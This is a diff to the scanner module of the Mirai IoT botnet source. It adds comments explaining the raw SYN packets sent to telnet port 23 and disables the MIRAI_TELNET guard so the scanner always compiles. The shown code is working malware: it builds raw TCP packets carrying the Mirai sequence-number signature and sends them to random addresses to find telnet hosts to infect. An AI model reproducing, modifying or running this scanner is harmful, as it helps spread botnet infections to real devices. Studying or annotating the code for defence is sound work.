@@ -1,8 +1,8 @@
 #define _GNU_SOURCE
 
-#ifdef MIRAI_TELNET
+//#ifdef MIRAI_TELNET
 
-//#ifdef DEBUG
+#ifdef DEBUG
 #include <stdio.h>
 #endif
 #include <unistd.h>
@@ -222,14 +222,14 @@ void scanner_init(void)
                 {
                     tcph->dest = htons(23);
                 }
-                tcph->seq = iph->daddr;
+                tcph->seq = iph->daddr; // same seq as ip - Mirai signature
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
-
-                paddr.sin_family = AF_INET;
-                paddr.sin_addr.s_addr = iph->daddr;
-                paddr.sin_port = tcph->dest;
-
+                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr)); // generate checksum
+                    // internet socket adress
+                paddr.sin_family = AF_INET; //AF_INET for IPv4
+                paddr.sin_addr.s_addr = iph->daddr; // socket is open to the dest
+                paddr.sin_port = tcph->dest; // port 23
+                    //send the packet
                 sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
             }
         }
@@ -988,4 +988,4 @@ static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amoun
     return ptr + amount < end;
 }
 
-#endif
+//#endif
